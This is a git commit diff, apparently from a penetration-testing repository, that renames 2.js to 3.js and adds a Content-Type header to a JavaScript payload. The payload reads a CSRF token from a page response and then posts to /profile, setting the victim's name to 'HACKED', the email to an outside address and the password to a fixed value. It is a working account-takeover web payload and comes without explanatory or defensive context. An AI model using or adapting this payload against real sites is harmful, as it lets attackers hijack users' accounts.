6b4d51f108837bd90c6f0c17090743d6a8ae21cd
pentest133 <157604553+pentest133@users.noreply.github.com>
2024-12-27 17:48:20 +0100

    Update and rename 2.js to 3.js

--- 3.js
+++ 3.js
@@ -6,5 +6,6 @@ function handleResponse() {
     var token = this.responseText.match(/name="_token" value="(\w+)"/)[1];
     var changeReq = new XMLHttpRequest();
     changeReq.open('POST', '/profile', true);
+    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
     changeReq.send('_token='+token+'&name=HACKED&email=bayan29846@chansd.com&gravataremail=&password=Hacked123!!&password_confirm=Hacked123!!')
 };
